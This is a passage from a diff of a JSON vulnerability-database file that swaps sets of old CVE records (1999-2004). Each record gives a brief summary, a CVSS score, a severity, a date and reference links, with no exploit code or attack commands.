-        "http://online.securityfocus.com/archive/1/284691",
-        "http://www.iss.net/security_center/static/9692.php"
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "http://www.iss.net/security_center/static/9263.php",
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "http://www.iss.net/security_center/static/9263.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2177",
-      "summary": "BEA WebLogic Server and Express 6.1 through 7.0.0.1 buffers HTTP requests in a way that can cause BEA to send the same response for two different HTTP requests, which could allow remote attackers to obtain sensitive information that was intended for other users.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://dev2dev.bea.com/pub/advisory/38",
-        "http://www.iss.net/security_center/static/10221.php",
-        "http://www.securityfocus.com/bid/5819",
-        "http://dev2dev.bea.com/pub/advisory/38",
-        "http://www.iss.net/security_center/static/10221.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2178",
-      "summary": "Cross-site scripting (XSS) vulnerability in article.php module for phpWebSite 0.8.3 allows remote attackers to execute arbitrary Javascript script via the sid parameter, as demonstrated using an IMG tag.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.iss.net/security_center/static/10256.php",
-        "http://www.securityfocus.com/archive/1/293879",
-        "http://www.securityfocus.com/bid/5864",
-        "http://www.iss.net/security_center/static/10256.php",
-        "http://www.securityfocus.com/archive/1/293879"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2179",
-      "summary": "The dynamic initialization feature of the ClearPath MCP environment allows remote attackers to cause a denial of service (crash) via a TCP port scan using a tool such as nmap.",
-      "cvssScore": 7.8,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.iss.net/security_center/static/10260.php",
-        "http://www.securityfocus.com/archive/1/293881",
-        "http://www.securityfocus.com/archive/1/295837",
-        "http://www.securityfocus.com/bid/5863",
-        "http://www.iss.net/security_center/static/10260.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2180",
-      "summary": "The setitimer(2) system call in OpenBSD 2.0 through 3.1 does not properly check certain arguments, which allows local users to write to kernel memory and possibly gain root privileges, possibly via an integer signedness error.",
-      "cvssScore": 6.8,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.0/common/032_kerntime.patch",
-        "http://www.iss.net/security_center/static/10278.php",
-        "http://www.openbsd.org/plus32.html",
-        "http://www.securityfocus.com/bid/5861",
-        "ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.0/common/032_kerntime.patch"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2181",
-      "summary": "SonicWall Content Filtering allows local users to access prohibited web sites via requests to the web site's IP address instead of the domain name.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.iss.net/security_center/static/10531.php",
-        "http://www.securityfocus.com/archive/1/297692",
-        "http://www.securityfocus.com/bid/6063",
-        "http://www.iss.net/security_center/static/10531.php",
-        "http://www.securityfocus.com/archive/1/297692"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2182",
-      "summary": "Buffer overflow in Seunghyun Seo's MSN666 MSN Sniffer 1.0 and 1.0.1 allows remote attackers to execute arbitrary code via a long MSN packet.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/276943",
-        "http://online.securityfocus.com/archive/1/276955",
-        "http://www.securityfocus.com/archive/1/276958",
-        "http://www.securityfocus.com/bid/5015",
-        "http://online.securityfocus.com/archive/1/276943"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2183",
-      "summary": "phpShare.php in phpShare before 0.6 beta 3 allows remote attackers to include and execute arbitrary PHP scripts from remote servers.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/5049",
-        "http://www.securityfocus.com/bid/5049"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2184",
-      "summary": "Digi-Net Technologies DigiChat 3.5 allows chat users to obtain the IP addresses of other chat users via a \"Showip\" parameter in the chat applet.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/5019",
-        "http://www.securityfocus.com/bid/5019"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2185",
-      "summary": "The Internet Group Management Protocol (IGMP) allows local users to cause a denial of service via an IGMP membership report to a target's Ethernet address instead of the Multicast group address, which causes the target to stop sending reports to the router and effectively disconnect the group from the network.",
-      "cvssScore": 4.9,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://patches.sgi.com/support/free/security/advisories/20020901-01-A",
-        "http://online.securityfocus.com/archive/1/276968",
-        "http://secunia.com/advisories/18510",
-        "http://secunia.com/advisories/18562",
-        "http://secunia.com/advisories/18684"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1752",
-      "summary": "Stack-based buffer overflow in Gaucho 1.4 Build 145 allows remote attackers to execute arbitrary code via a POP3 email with a long Content-Type header.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-08-24",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109364123707953&w=2",
-        "http://secunia.com/advisories/12387",
-        "http://securitytracker.com/id?1011032",
-        "http://www.security.org.sg/vuln/gaucho140.html",
-        "http://www.securityfocus.com/bid/11023"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0819",
-      "summary": "The bridge functionality in OpenBSD 3.4 and 3.5, when running a gateway configured as a bridging firewall with the link2 option for IPSec enabled, allows remote attackers to cause a denial of service (crash) via an ICMP echo (ping) packet.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-08-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109345131508824&w=2",
-        "http://openbsd.org/errata34.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17129",
-        "http://marc.info/?l=bugtraq&m=109345131508824&w=2",
-        "http://openbsd.org/errata34.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1662",
-      "summary": "YaBB SE 1.5.1 allows remote attackers to obtain sensitive information via a direct HTTP request to Admin.php, which reveals the full path in a PHP error message.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-08-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://echo.or.id/adv/adv05-y3dips-2004.txt",
-        "http://marc.info/?l=bugtraq&m=109441750900432&w=2",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17267",
-        "http://echo.or.id/adv/adv05-y3dips-2004.txt",
-        "http://marc.info/?l=bugtraq&m=109441750900432&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0975",
-      "summary": "Buffer overflow in Microsoft DirectX Files Viewer ActiveX control (xweb.ocx) 2.0.6.15 and earlier allows remote attackers to execute arbitrary via a long File parameter.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-09-24",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=102953851705859&w=2",
-        "http://www.iss.net/security_center/static/9877.php",
-        "http://www.securityfocus.com/bid/5489",
-        "http://marc.info/?l=bugtraq&m=102953851705859&w=2",
-        "http://www.iss.net/security_center/static/9877.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0426",
-      "summary": "VPN Server module in Linksys EtherFast BEFVP41 Cable/DSL VPN Router before 1.40.1 reduces the key lengths for keys that are supplied via manual key entry, which makes it easier for attackers to crack the keys.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-08-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.linksys.com/pub/befsr41/befvp41-1402.zip",
-        "http://online.securityfocus.com/archive/1/260613",
-        "http://www.iss.net/security_center/static/8397.php",
-        "http://www.securityfocus.com/bid/4250",
-        "ftp://ftp.linksys.com/pub/befsr41/befvp41-1402.zip"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0427",
-      "summary": "Buffer overflows in fpexec in mod_frontpage before 1.6.1 may allow attackers to gain root privileges.",
+      "id": "CVE-2002-0395",
+      "summary": "The TFTP server for Red-M 1050 (Bluetooth Access Point) can not be disabled and makes it easier for remote attackers to crack the administration password via brute force methods.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2002-08-12",
+      "published": "2002-07-26",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-02:17.mod_frontpage.asc",
-        "http://www.iss.net/security_center/static/8400.php",
-        "http://www.linux-mandrake.com/en/security/2002/MDKSA-2002-021.php",
-        "http://www.securityfocus.com/bid/4251",
-        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-02:17.mod_frontpage.asc"
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9264",
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9264"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0428",
-      "summary": "Check Point FireWall-1 SecuRemote/SecuClient 4.0 and 4.1 allows clients to bypass the \"authentication timeout\" by modifying the to_expire or expire values in the client's users.C configuration file.",
+      "id": "CVE-2002-0396",
+      "summary": "The web management server for Red-M 1050 (Bluetooth Access Point) does not use session-based credentials to authenticate users, which allows attackers to connect to the server from the same IP address as a user who has already established a session.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2002-08-12",
+      "published": "2002-07-26",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://online.securityfocus.com/archive/1/260662",
-        "http://www.iss.net/security_center/static/8423.php",
-        "http://www.securityfocus.com/bid/4253",
-        "http://online.securityfocus.com/archive/1/260662",
-        "http://www.iss.net/security_center/static/8423.php"
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "http://www.securityfocus.com/bid/4940",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9265",
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "http://www.securityfocus.com/bid/4940"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0429",
-      "summary": "The iBCS routines in arch/i386/kernel/traps.c for Linux kernels 2.4.18 and earlier on x86 systems allow local users to kill arbitrary processes via a a binary compatibility interface (lcall).",
-      "cvssScore": 3.6,
-      "severity": "Low",
-      "published": "2002-08-12",
+      "id": "CVE-2002-0397",
+      "summary": "Red-M 1050 (Bluetooth Access Point) publicizes its name, IP address, and other information in UDP packets to a broadcast address, which allows any system on the network to obtain potentially sensitive information about the Access Point device by monitoring UDP port 8887.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-07-26",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=101561298818888&w=2",
-        "http://www.debian.org/security/2003/dsa-311",
-        "http://www.debian.org/security/2003/dsa-312",
-        "http://www.debian.org/security/2003/dsa-332",
-        "http://www.debian.org/security/2003/dsa-336"
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9266",
+        "http://www.atstake.com/research/advisories/2002/a060502-1.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9266"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0430",
-      "summary": "MultiFileUploadHandler.php in the Sun Cobalt RaQ XTR administration interface allows local users to bypass authentication and overwrite arbitrary files via a symlink attack on a temporary file, followed by a request to MultiFileUpload.php.",
-      "cvssScore": 3.7,
-      "severity": "Low",
-      "published": "2002-08-12",
+      "id": "CVE-2000-0180",
+      "summary": "Sojourn search engine allows remote attackers to read arbitrary files via a .. (dot dot) attack.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-03-14",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-03/0081.html",
-        "http://www.securityfocus.com/bid/4252",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-03/0081.html",
-        "http://www.securityfocus.com/bid/4252"
+        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q1/0201.html",
+        "http://www.securityfocus.com/bid/1052",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4197",
+        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q1/0201.html",
+        "http://www.securityfocus.com/bid/1052"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0451",
-      "summary": "filemanager_forms.php in PHProjekt 3.1 and 3.1a allows remote attackers to execute arbitrary PHP code by specifying the URL to the code in the lib_path parameter.",
+      "id": "CVE-2000-0199",
+      "summary": "When a new SQL Server is registered in Enterprise Manager for Microsoft SQL Server 7.0 and the \"Always prompt for login name and password\" option is not set, then the Enterprise Manager uses weak encryption to store the login ID and password.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2000-03-14",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/1055",
+        "http://www.securityfocus.com/bid/1055"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1456",
+      "summary": "filediff in CVStrac allows remote attackers to execute arbitrary commands via shell metacharacters in rcsinfo.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2002-08-12",
+      "published": "2004-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.iss.net/security_center/static/8448.php",
-        "http://www.phprojekt.com/modules.php?op=modload&name=News&file=article&sid=19&mode=&order=",
-        "http://www.securityfocus.com/archive/1/261676",
-        "http://www.securityfocus.com/bid/4284",
-        "http://www.iss.net/security_center/static/8448.php"
+        "http://marc.info/?l=bugtraq&m=109173359428253&w=2",
+        "http://secunia.com/advisories/12090/",
+        "http://www.cvstrac.org/cvstrac/chngview?cn=316",
+        "http://www.cvstrac.org/cvstrac/tktview?tn=339",
+        "http://www.kb.cert.org/vuls/id/770816"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0452",
-      "summary": "Foundry Networks ServerIron switches do not decode URIs when applying \"url-map\" rules, which could make it easier for attackers to cause the switch to forward traffic to a different server than intended and exploit vulnerabilities that would otherwise be inaccessible.",
+      "id": "CVE-2004-1457",
+      "summary": "The Virtual Private Network (VPN) capability in Novell Bordermanager 3.8 allows remote attackers to cause a denial of service (ABEND in IKE.NLM) via a malformed IKE packet, as sent by the Striker ISAKMP Protocol Test Suite.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/12067/",
+        "http://support.novell.com/cgi-bin/search/searchtid.cgi?/10093576.htm",
+        "http://www.kb.cert.org/vuls/id/432097",
+        "http://www.securityfocus.com/bid/10727",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16697"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1458",
+      "summary": "The CSAdmin web administration interface for Cisco Secure Access Control Server (ACS) 3.2(2) build 15 allows remote attackers to cause a denial of service (hang) via a flood of TCP connections to port 2002.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://osvdb.org/9182",
+        "http://secunia.com/advisories/12386/",
+        "http://www.ciac.org/ciac/bulletins/o-203.shtml",
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040825-acs.shtml",
+        "http://www.securityfocus.com/bid/11047"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1459",
+      "summary": "Cisco Secure Access Control Server (ACS) 3.2, when configured as a Light Extensible Authentication Protocol (LEAP) RADIUS proxy, allows remote attackers to cause a denial of service (device crash) via certain LEAP authentication requests.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040825-acs.shtml",
+        "http://www.securityfocus.com/bid/11047",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17116",
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040825-acs.shtml",
+        "http://www.securityfocus.com/bid/11047"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1460",
+      "summary": "Cisco Secure Access Control Server (ACS) 3.2(3) and earlier, when configured with an anonymous bind in Novell Directory Services (NDS) and authenticating NDS users with NDS, allows remote attackers to gain unauthorized access to AAA clients via a blank password.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2002-08-12",
+      "published": "2004-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.iss.net/security_center/static/8459.php",
-        "http://www.securityfocus.com/archive/1/261834",
-        "http://www.securityfocus.com/bid/4286",
-        "http://www.iss.net/security_center/static/8459.php",
-        "http://www.securityfocus.com/archive/1/261834"
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040825-acs.shtml",
+        "http://www.securityfocus.com/bid/11047",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17117",
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040825-acs.shtml",
+        "http://www.securityfocus.com/bid/11047"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2062",
-      "summary": "Cross-site scripting (XSS) vulnerability in ftp.htt in Internet Explorer 5.5 and 6.0, when running on Windows 2000 with \"Enable folder view for FTP sites\" and \"Enable Web content in folders\" selected, allows remote attackers to inject arbitrary web script or HTML via the hostname portion of an FTP URL.",
-      "cvssScore": 4.3,
+      "id": "CVE-2004-1461",
+      "summary": "Cisco Secure Access Control Server (ACS) 3.2(3) and earlier spawns a separate unauthenticated TCP connection on a random port when a user authenticates to the ACS GUI, which allows remote attackers to bypass authentication by connecting to that port from the same IP address.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040825-acs.shtml",
+        "http://www.securityfocus.com/bid/11047",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17118",
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040825-acs.shtml",
+        "http://www.securityfocus.com/bid/11047"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1462",
+      "summary": "Unknown vulnerability in MoinMoin 1.2.2 and earlier allows remote attackers to gain unauthorized access to administrator functions such as (1) revert and (2) delete.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.gentoo.org/security/en/glsa/glsa-200408-25.xml",
+        "http://www.osvdb.org/displayvuln.php?osvdb_id=8194",
+        "http://www.securityfocus.com/bid/10805",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16833",
+        "https://sourceforge.net/project/shownotes.php?group_id=8482&release_id=254801"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1463",
+      "summary": "Unknown vulnerability in the PageEditor in MoinMoin 1.2.2 and earlier, related to Access Control Lists (ACL), has unknown impact.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://sourceforge.net/project/shownotes.php?group_id=8482&release_id=254801",
+        "http://www.gentoo.org/security/en/glsa/glsa-200408-25.xml",
+        "http://www.osvdb.org/displayvuln.php?osvdb_id=8195",
+        "http://www.securityfocus.com/bid/10801",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16832"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1110",
+      "summary": "Windows Media Player ActiveX object as used in Internet Explorer 5.0 returns a specific error code when a file does not exist, which allows remote malicious web sites to determine the existence of files on the client.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-11-14",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/34675",
+        "http://www.securityfocus.com/bid/793",
+        "http://www.securityfocus.com/archive/1/34675",
+        "http://www.securityfocus.com/bid/793"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1528",
+      "summary": "ProSoft Netware Client 5.12 on Macintosh MacOS 9 does not automatically log a user out of the NDS tree when the user logs off the system, which allows other users of the same system access to the unprotected NDS session.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "1999-11-14",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=94261444428430&w=2",
+        "http://www.securityfocus.com/bid/794",
+        "http://marc.info/?l=bugtraq&m=94261444428430&w=2",
+        "http://www.securityfocus.com/bid/794"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1190",
+      "summary": "Buffer overflow in POP3 server of Admiral Systems EmailClub 1.05 allows remote attackers to execute arbitrary commands via a long \"From\" header in an e-mail message.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-11-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securiteam.com/exploits/E-MailClub__FROM__remote_buffer_overflow.html",
+        "http://www.securityfocus.com/bid/801",
+        "http://www.securiteam.com/exploits/E-MailClub__FROM__remote_buffer_overflow.html",
+        "http://www.securityfocus.com/bid/801"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1051",
+      "summary": "Default configuration in Matt Wright FormHandler.cgi script allows arbitrary directories to be used for attachments, and only restricts access to the /etc/ directory, which allows remote attackers to read arbitrary files via the reply_message_attach attachment parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-11-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/34939",
+        "http://www.securityfocus.com/archive/1/34939"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1457",
+      "summary": "Buffer overflow in thttpd HTTP server before 2.04-31 allows remote attackers to execute arbitrary commands via a long date string, which is not properly handled by the tdate_parse function.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1999-11-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.novell.com/linux/security/advisories/suse_security_announce_30.html",
+        "http://www.novell.com/linux/security/advisories/suse_security_announce_30.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1508",
+      "summary": "Web server in Tektronix PhaserLink Printer 840.0 and earlier allows a remote attacker to gain administrator access by directly calling undocumented URLs such as ncl_items.html and ncl_subjects.html.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-11-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=94286041430870&w=2",
+        "http://www.securityfocus.com/bid/806",
+        "http://marc.info/?l=bugtraq&m=94286041430870&w=2",
+        "http://www.securityfocus.com/bid/806"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1789",
+      "summary": "Format string vulnerability in newsx NNTP client before 1.4.8 allows local users to execute arbitrary code via format string specifiers that are not properly handled in a call to the syslog function.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SN-02:05.asc",
+        "http://www.iss.net/security_center/static/9583.php",
+        "http://www.securityfocus.com/bid/5240",
+        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SN-02:05.asc",
+        "http://www.iss.net/security_center/static/9583.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1790",
+      "summary": "The SMTP service in Microsoft Internet Information Services (IIS) 4.0 and 5.0 allows remote attackers to bypass anti-relaying rules and send spam or spoofed messages via encapsulated SMTP addresses, a similar vulnerability to CVE-1999-0682.",
+      "cvssScore": 5,
       "severity": "Medium",
       "published": "2002-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-06/0037.html",
-        "http://www.geocities.co.jp/SiliconValley/1667/advisory02e.html",
-        "http://www.iss.net/security_center/static/9290.php",
-        "http://www.securityfocus.com/bid/4954",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-06/0037.html"
+        "http://online.securityfocus.com/archive/1/281914",
+        "http://www.iss.net/security_center/static/9580.php",
+        "http://www.securityfocus.com/bid/5213",
+        "http://online.securityfocus.com/archive/1/281914",
+        "http://www.iss.net/security_center/static/9580.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2063",
-      "summary": "AtGuard 3.2 allows remote attackers to bypass firwall filters and execute prohibited programs by changing the filenames to permitted filenames.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-04/0412.html",
-        "http://www.iss.net/security_center/static/8962.php",
-        "http://www.securityfocus.com/bid/4620",
-        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-04/0412.html",
-        "http://www.iss.net/security_center/static/8962.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2064",
-      "summary": "isadmin.php in PhpWebGallery 1.0 allows remote attackers to gain administrative access via by setting the photo_login cookie to pseudo.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://seclists.org/lists/vuln-dev/2002/Apr/0270.html",
-        "http://www.ifrance.com/kitetoua/tuto/PWG.txt",
-        "http://www.securityfocus.com/bid/4622",
-        "http://seclists.org/lists/vuln-dev/2002/Apr/0270.html",
-        "http://www.ifrance.com/kitetoua/tuto/PWG.txt"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1108",
-      "summary": "cons.saver in Midnight Commander (mc) 4.5.42 and earlier does not properly verify if an output file descriptor is a TTY, which allows local users to corrupt files by creating a symbolic link to the target file, calling mc, and specifying that link as a TTY argument.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0192.html",
-        "http://www.debian.org/security/2000/20001125",
-        "http://www.linux-mandrake.com/en/security/MDKSA-2000-078.php3",
-        "http://www.securityfocus.com/bid/1945",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5519"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1109",
-      "summary": "Midnight Commander (mc) 4.5.51 and earlier does not properly process malformed directory names when a user opens a directory, which allows other local users to gain privileges by creating directories that contain special characters followed by the commands to be executed.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0373.html",
-        "http://www.debian.org/security/2001/dsa-036",
-        "http://www.novell.com/linux/security/advisories/2001_011_mc.html",
-        "http://www.securityfocus.com/bid/2016",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5929"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1110",
-      "summary": "document.d2w CGI program in the IBM Net.Data db2www package allows remote attackers to determine the physical path of the web server by sending a nonexistent command to the program.",
+      "id": "CVE-1999-0193",
+      "summary": "Denial of service in Ascend and 3com routers, which can be rebooted by sending a zero length TCP option.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "1997-12-01",
       "modified": null,
       "cwe": null,
       "references": [
